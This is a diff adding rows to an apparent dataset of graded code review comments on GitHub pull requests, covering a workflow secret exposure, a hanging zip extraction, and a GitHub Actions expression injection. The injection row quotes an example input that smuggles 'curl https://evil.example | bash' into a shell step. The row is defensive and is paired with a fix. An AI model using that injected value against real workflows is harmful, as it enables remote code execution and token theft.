@@ -21814,3 +21814,43 @@ jobs:
 ```
 
 Alternatively, if the two-workflow split is too complex, the minimum viable fix is to **remove the PR head checkout** (keep only the base branch) and only use `pull_request_target` for the comment-posting step while keeping the build itself in a `pull_request` context.",https://github.com/NVIDIA-NeMo/Curator/pull/1660#discussion_r2983984781,,2026-03-24T20:03:41.899000,Secret exposure via pull_request_target with untrusted code checkout,security,critical,9,"This identifies a critical security vulnerability where the workflow uses pull_request_target (which has secret access) combined with checking out untrusted PR code, allowing malicious contributors to exfiltrate the DOCS_FERN_TOKEN. This is a well-documented GitHub Actions security anti-pattern that could lead to credential theft.",2026-03-25T16:38:02.349080+00:00
+raycast/extensions,25466,Add Extension: GitHub repo directory download,https://github.com/raycast/extensions/pull/25466,"**Unhandled `mkdirp` rejection causes the download to hang indefinitely**
+
+The `mkdirp(entryDir).then(...)` call has no `.catch()`. If directory creation fails (e.g., due to a permissions error), the rejection is swallowed and `zipfile.readEntry()` is never called again. With `lazyEntries: true`, yauzl only emits the next entry when `readEntry()` is called, so no further entries are processed, the `end` event never fires, and the outer `Promise<void>` neither resolves nor rejects — hanging the download silently forever.
+
+Add a `.catch(reject)` to propagate the error:
+
+```suggestion
+              mkdirp(entryDir).then(() => {
+                zipfile.openReadStream(entry, (err, readStream) => {
+                  if (err) return reject(err);
+                  const writeStream = fs.createWriteStream(entryDest);
+                  readStream.pipe(writeStream);
+
+                  writeStream.on(""finish"", () => {
+                    extractedCount++;
+                    zipfile.readEntry();
+                  });
+                  writeStream.on(""error"", reject);
+                });
+              }).catch(reject);
+```",https://github.com/raycast/extensions/pull/25466#discussion_r2884387781,,2026-03-04T15:18:02.930000,Unhandled promise rejection causes download to hang forever,resource_leak,high,8,"This is a meaningful bug where an unhandled promise rejection in mkdirp causes the yauzl zip extraction to hang indefinitely. With lazyEntries mode, readEntry() is never called again after a directory creation failure, leaving the promise neither resolved nor rejected - a silent hang that would frustrate users in production.",2026-03-25T18:32:13.057750+00:00
+nvidia-nemo/curator,1663,more project board gha updates,https://github.com/NVIDIA-NeMo/Curator/pull/1663,"<a href=""#""><img alt=""P0"" src=""https://greptile-static-assets.s3.amazonaws.com/badges/p0.svg?v=7"" align=""top""></a> **Expression injection via `lookback_hours` input**
+
+`${{ github.event.inputs.lookback_hours || '3' }}` is substituted verbatim into the shell script body before it runs. A user with write access who triggers `workflow_dispatch` with a crafted value — for example `3"" && curl https://evil.example | bash #` — would produce:
+
+```bash
+HOURS=""3"" && curl https://evil.example | bash #""
+```
+
+Because the workflow runs with the `PAT` secret, a successful injection could exfiltrate or misuse that token. The recommended fix is to expose the input as a step-level environment variable and reference it from there:
+
+```yaml
+      - name: Find recently added items with unset fields and set defaults
+        env:
+          LOOKBACK_HOURS: ${{ github.event.inputs.lookback_hours || '3' }}
+        run: |
+          HOURS=""${LOOKBACK_HOURS:-3}""
+```
+
+The same pattern applies to `.github/workflows/project-done-docs-update.yml` line 27.",https://github.com/NVIDIA-NeMo/Curator/pull/1663#discussion_r2989026225,,2026-03-25T15:25:40.022000,Expression injection vulnerability allows PAT token exfiltration,security,critical,9,"This is a genuine security vulnerability where unsanitized workflow_dispatch input is interpolated directly into shell script, allowing command injection. An attacker with write access could exfiltrate the PAT secret token. The comment provides a clear exploit example and proper fix.",2026-03-25T18:32:13.057750+00:00
